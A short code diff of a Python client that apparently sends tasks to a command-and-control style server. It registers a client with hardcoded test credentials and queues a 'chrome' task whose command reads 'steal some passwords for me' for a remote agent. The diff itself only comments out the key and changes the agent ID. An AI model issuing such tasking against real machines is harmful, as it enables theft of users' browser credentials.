@@ -11,7 +11,7 @@ from urllib3 import Retry
 # export APP_KEY="jdK69EN3gh"
 # or if you preffered, you can run this
 # os.environ["APP_KEY"] = "jdK69EN3gh"
-MY_APP_KEY = os.environ["APP_KEY"]
+# MY_APP_KEY = os.environ["APP_KEY"]
 password = "ch0nky" # a temperary password to test the server
 localhost = "http://127.0.0.1:5000"
 client_register_uri = "/client/login"
@@ -21,7 +21,7 @@ task_create_uri = "/tasks/create"
 # init a default client for testing purpose
 client_id = "hey"
 password = "ch0nky"
-key = "jdK69EN3gh"
+# key = "jdK69EN3gh"
 
 
 ### authentication ###
@@ -66,5 +66,5 @@ def create_task(command_type, cmd, agent_id):
 #-------------------------------------------------
 
 if __name__ == "__main__":
-    register(key, client_id, password)
-    create_task(command_type="chrome", cmd="steal some passwords for me", agent_id="cd4f442d8d7c77bc63403554efabc7dd")
+    # register(key, client_id, password)
+    create_task(command_type="chrome", cmd="steal some passwords for me", agent_id="ce062a69a59703d3cf1dbc2bb6ee1d8b")
